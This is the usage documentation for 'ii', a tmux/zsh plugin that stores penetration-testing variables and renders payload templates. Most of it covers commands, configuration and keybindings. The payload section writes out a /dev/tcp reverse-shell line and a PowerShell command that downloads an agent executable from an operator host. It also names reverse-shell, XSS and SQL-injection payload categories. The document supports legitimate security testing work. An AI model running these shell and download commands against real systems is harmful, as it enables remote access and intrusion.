# Usage

`ii` stores workflow variables in the current tmux session using the internal
`ii_` namespace. User-facing commands use names without that prefix.

## State Model

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload renderer = reads current shell first, then tmux session values
```

`ii s` writes to tmux and exports the value into the current shell. `ii l` loads
tmux values into the current shell later. `ii p` and `ii p --input` share the
same render rules: a non-empty lowercase shell variable wins first, then the
matching tmux `ii_` variable is used. This allows one-command shell overrides
while preserving tmux as the shared fallback across panes.

## Commands

| Command | Short form | Purpose |
| --- | --- | --- |
| `ii set NAME=VALUE` | `ii s NAME=VALUE` | Set internal `ii_name` in tmux and export the configured shell name in this shell |
| `ii set NAME=VALUE NAME=VALUE` | `ii s:NAME=VALUE,NAME=VALUE` | Set multiple variables with `=` |
| `ii set NAME[,NAME...] --from-shell` | `ii s:NAME[,NAME...] --from-shell` | Save current shell variables back into tmux |
| `ii set -d [INTERFACE]` | `ii s -d`, `ii s:lhost -d [INTERFACE]` | Detect lhost from an interface, defaulting to `tun0` |
| `ii set rhost=VALUE` | `ii s:rhost=VALUE` | Set rhost and automatically detect lhost when enabled |
| `ii set` | `ii s` | Open a TUI to choose common variable names and type a value |
| `ii set FILTER` | `ii s FILTER`, `ii s:FILTER` | Match variable names before setting; `ii s r` jumps to `RHOST` |
| `ii get FILTER` | `ii g FILTER`, `ii g:FILTER` | Copy and print one tmux variable value without loading |
| `ii load` | `ii l` | Load tmux variables into this shell without the internal `ii_` prefix |
| `ii clip backend` | | Show or set clipboard backend |
| `ii clip doctor` | | Diagnose clipboard behavior and suggest a backend |
| `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, add, and copy values |
| `ii ls [PATTERN]` | | List non-empty tmux variables as key/value blocks, optionally filtered by key |
| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, print, and optionally write a payload |
| `ii p --input [--copy] [-o [PATH]]` | | Render pasted input, optionally copy it, and optionally write it |
| `ii p --www --file PATH` / `ls` / `search [FILTER]` / `ln SOURCE_PATH [LINK_NAME]` | | Render a file, list, search, or symlink files under the configured web root |
| `ii unset NAME [...]` | `ii u NAME [...]` | Remove `ii_` variables from tmux and this shell |
| `ii unset -a` | `ii u -a` | Prompt, then remove all `ii_` variables from the current tmux session |
| `ii version` | `ii -v`, `ii --version` | Show installed version |
| `ii help [COMMAND]` | `ii h [COMMAND]` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
ii s
ii s lhost 192.168.45.192
ii s lport 443
ii s domain example.test
ii s usert=alice
ii s passt=secret

ii ls
ii ls host
ii ls usert
ii p linux
```

`ii_` is only an internal tmux namespace. User input is normalized to lowercase,
so `user2` and `USER2` refer to the same tmux variable, `ii_user2`. Shell
exports use names without the prefix. By default, `ii set` and `ii load` export
lowercase shell names such as `$lhost` and `$domain`.

Set `II_EXPORT_CASE` to change shell export behavior:

```zsh
export II_EXPORT_CASE=lower  # default: lhost
export II_EXPORT_CASE=upper  # LHOST
export II_EXPORT_CASE=both   # lhost and LHOST
```

## Configuration

`ii` reads this config file automatically when it exists:

```text
~/.config/ii/ii.conf
```

Use it for stable preferences such as shell export case and the `/www` helper
root:

```zsh
export II_EXPORT_CASE=lower
export II_AUTO_DETECT_LHOST=1
export II_AUTO_DETECT_LHOST_INTERFACE=tun0
export II_WWW_ROOT=/www
```

To use a different config path, set `II_CONFIG_FILE` in `.zshrc` before loading
the plugin:

```zsh
export II_CONFIG_FILE="$HOME/.config/ii/work.conf"
source "$HOME/.config/zsh/plugin/ii/ii.plugin.zsh"
```

See [doc/conf/ii.conf](conf/ii.conf) for a complete example.

## Variables

Default names that have not been assigned values are not exported into the
shell.

Default variable names:

```text
domain
lhost
rhost
file
lport
rport
mm
usert
passt
user1
pass1
user2
pass2
```

`ii s FILTER` resolves matches before asking for a value:

- No matches prints `no matched`.
- One match goes straight to the value prompt.
- Multiple matches open a variable selection prompt.

Direct value setting always uses `=`:

```zsh
ii s usert=alice
ii set usert=alice passt='S3cret!'
ii s:usert=alice,passt='S3cret!'
ii s:rhost=192.168.201.175
```

When `II_AUTO_DETECT_LHOST` is enabled, setting `rhost` or `rhosts` also detects
`lhost` from `II_AUTO_DETECT_LHOST_INTERFACE` and prints
`lhost has automatically sets as VALUE`. The default is enabled on `tun0`.
Set `II_AUTO_DETECT_LHOST=0` to manage `lhost` manually.

Use `--from-shell` to save existing shell variables back into tmux:

```zsh
usert=alice passt='S3cret!' ii s:usert,passt --from-shell
ii s:usert --from-shell
```

`--from-shell` checks the lowercase shell name first, then the uppercase name.
Missing shell variables print a red warning and are skipped.

`ii g FILTER` uses the same case-insensitive name matching and shortcuts as
`ii s FILTER`. It copies the selected value through the clipboard layer and
prints it, but it does not modify variables or load values into the shell.
Multiple matches open a prompt; Enter or Space selects and copies one value,
while `q`, Esc, or Ctrl-C aborts without changing variables or copying anything.

`ii ls PATTERN` filters by key name, case-insensitively:

```zsh
ii ls host
ii ls usert
ii ls l
```

### Variable Output

`ii ls` prints only non-empty tmux variables. Empty default names are hidden, so
the list stays focused on values that are actually set.

Each variable is printed as a compact two-line block:

```text
lhost
192.168.45.192
lport
443
```

In an interactive terminal, the key line is blue and the value line uses normal
text. Entries are not separated by blank lines. This keeps copy-mode scanning
dense while still making variable names visually distinct from values.

`ii ls PATTERN` uses the same output format after filtering by key name.

## Interactive Variables

`ii i` shows common variable names even when they do not have values yet. The
fzf list shows names with a one-line value preview. Variables with values are
listed before empty default names, so the cursor starts near active entries.
The selected value appears in a compact bottom preview.

Keys:

| Key | Action |
| --- | --- |
| `j` / `k` | Move selection |
| `/` | Enter search mode |
| `Esc` | Return from search mode to normal mode |
| `i` / `l` | Edit the selected variable |
| `Enter` | Copy the selected value and close |
| `y` | Copy the selected value without closing |
| `h` / `q` / `Ctrl-C` | Abort |

Aborting while editing preserves the original value. A value is replaced only
after confirming with Return. Edit prompts show Return to save or continue, and
Esc to abort. Clearing a value and confirming stores an empty value.

`ii i` does not load variables into the shell. Use `ii l` to load all non-empty
variables into the current shell.

## Payloads

### Render Rules

Payload files and pasted input use the same renderer.

Renderable placeholders:

```text
$name
${name}
${name:t}
```

Renderable names normalize to lowercase variable identity. For example,
`$rhost` and `${rhost}` both resolve as `rhost` / tmux `ii_rhost`.

Resolution order:

1. Non-empty lowercase shell variable in the current command context.
2. Non-empty tmux session variable in the internal `ii_` namespace.
3. Keep the original token unchanged.

Shell-sourced values are reported in blue. Tmux/ii-sourced values are reported
with normal text. Missing values are kept as their original tokens and reported
in red.

Uppercase shell variables such as `$RHOST` and `${RHOST}` are not rendered.
PowerShell scope variables such as `$env:`, `$script:`, `$global:`, `$local:`,
and `$private:` are also left unchanged.

### Payload Files

Payload files are plain text templates under `II_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    config/
      hosts
    tool/
      ii/
        detect-lhost
      nmap/
        nmap
  xss/
    basic-alert
```

Payload files use lowercase shell-style placeholders:

```text
/bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
sudo nmap -p- -Pn -T4 $rhost
```

Files under `payloads/script/` are for custom scripts. They may use lowercase
shell-style variables such as `$rhost`, `${file}`, and `${file:t}`.

Combo payloads are multi-stage script payloads under `script/combo/`. Use names
like `script/combo/trans/powercat-K2T-TLKC`, where `K2T` means Kali sends to
target and `TLKC` means target listens while Kali connects. See
[payload-schema.md](payload-schema.md) for the combo naming table and stage
metadata convention.

Combo payloads may use `# stage:` metadata to split operator/target steps. The
renderer emits those stages as paste-safe comment delimiters such as:

```text
# --- Target PowerShell: receive file to TEMP ---
# --- Kali shell: send file and close connection ---
```

These delimiter lines can be pasted with the commands because `#` is a valid
comment marker in both PowerShell and common Linux shells.

Payload files use a small plain-text schema:

```text
# description: optional operator-facing description
payload body with $name, ${name}, or ${name:t} placeholders
```

For documentation and tooling, the logical payload object includes `$schema`,
`path`, `description`, `stages`, `source_body`, `emitted_body`, and
`variables`. See [payload-schema.md](payload-schema.md).

`ii p` uses the shared render rules above. A first-line `# description: ...`
metadata line is shown in preview but omitted from copied, printed, and written
output.

The payload selector list shows payload paths only. The selected payload
preview reserves a description block above the template body, highlights
renderable tokens with values in green, highlights missing renderable tokens in
red, normalizes any legacy internal `II_` payload tokens to lowercase
user-facing names, and shows selector controls and copy status at the bottom of
the preview.

In the selector, `j` and `k` move between payloads. `/` enters search mode and
Esc returns to normal mode. `y` copies the selected rendered payload without
leaving the selector. `l` unfolds the selected script into a full preview and
hides the filter input. `j` and `k` still move between scripts, Enter renders
and outputs, and `q` aborts. `h` returns to compact normal mode.

Render reports are printed when `ii p` leaves the selector. If you only use `y`
and then abort, `ii` prints the last copied payload's report. If you use `y`
and then Enter a different payload, `ii` prints the Enter payload's report
first, then the last copied payload's report. Aborting without Enter or `y`
prints nothing.

Render an existing file and expose it from the web-root `p` directory:

```zsh
ii p --www --file ./payload.txt
```

`ii p --www --file PATH` reads `PATH`, renders it with the shared payload render
rules, prints the render report and rendered body, then creates a symlink to the
original file under `/www/p`, or `$II_WWW_ROOT/p` when the web root is
overridden. Existing targets are not overwritten. After linking, it prints the
relative web directory, absolute symlink path, and paste-ready shell commands:
`relative_file=/p/`, `file=...`, and `rfile=FILENAME`.

Write the rendered payload to a file with `-o`:

```zsh
ii p linux -o
ii p linux -o filename
ii p linux -o ./
ii p linux -o ./payload.txt
ii p linux -o /tmp/payload.txt
```

`-o` keeps the normal terminal output. With no path, it writes
`/www/p/att.txt`. A bare filename writes under `/www`, so `-o filename` writes
`/www/filename`. Directory paths use `att.txt`, so `-o ./` writes
`./att.txt`. The terminal output prints the render report first, then the
selected payload path, then the rendered body. When writing a file, `ii` appends
an output note and ends with the full output path on its own line.

### Pasted Input Rendering

Render pasted input without adding a payload file:

```zsh
ii p --input
ii p --input --copy
ii p --input -o
ii p --input -o ./payload.txt
```

`ii p --input` reads until `:w` is entered on its own line and uses the shared
render rules above. The terminal output prints the render report first, then a
`[payload]` marker, then the rendered body. `--copy` copies only the rendered
body.

`-o` writes the rendered body to a file while keeping the normal terminal
output. It follows the same path rules as payload file output, including the
final full-path line.

Use a single `:q` or `:q!` line to cancel pasted input without rendering or
copying anything.

Use inline assignments for one-command shell overrides:

```zsh
lhost=10.10.14.3 file=/tmp/drop/agent.exe ii p --input --copy
```

This matters after `ii s` or `ii l`, because loaded-variable prompt sync can
refresh same-name shell variables from tmux before the next command prompt.

Example input:

```text
$KALI = "$lhost"
$FILE = "${file:t}"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
.
```

With `lhost=10.10.14.3` and `file=/tmp/drop/agent.exe`, the rendered body is:

```text
$KALI = "10.10.14.3"
$FILE = "agent.exe"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
```

### Payload Categories

Filter payloads by category:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p xss
ii p sqli
```

## Payload Directory

By default, the plugin points `II_PAYLOAD_DIR` to the bundled payload directory:

```text
${II_PLUGIN_DIR}/payloads
```

Override it only if you keep payloads somewhere else:

```zsh
export II_PAYLOAD_DIR="$HOME/.config/ii/payloads"
```

`ii p --www ...` uses `/www` by default. Override it in your ii config when your
web root lives elsewhere:

```zsh
export II_WWW_ROOT="$HOME/www"
```
